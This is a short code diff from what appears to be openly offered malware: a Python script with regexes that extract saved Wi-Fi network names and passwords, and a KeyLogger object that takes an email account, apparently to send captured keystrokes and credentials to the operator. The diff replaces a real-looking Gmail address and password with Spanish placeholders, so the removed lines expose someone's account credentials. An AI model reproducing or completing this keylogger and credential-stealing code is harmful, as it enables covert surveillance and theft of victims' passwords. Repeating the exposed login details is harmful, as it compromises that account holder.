@@ -38,8 +38,8 @@ regex_code_network_spanish = "(?:usuarios\s*:\s)(.*)"
 regex_code_password_english = "(?:Key\sContent\s*:\s)(\w*)(?:[^rn])"
 regex_code_network_english = "(?:Profile\s*:\s)(.*)"
 
-email = "vlackvincent936@gmail.com"
-password = "darkroses990"
+email = "su correo electronico"
+password = "su contraseña"
 
 key_recorder = key_logger.KeyLogger(email, password)
 
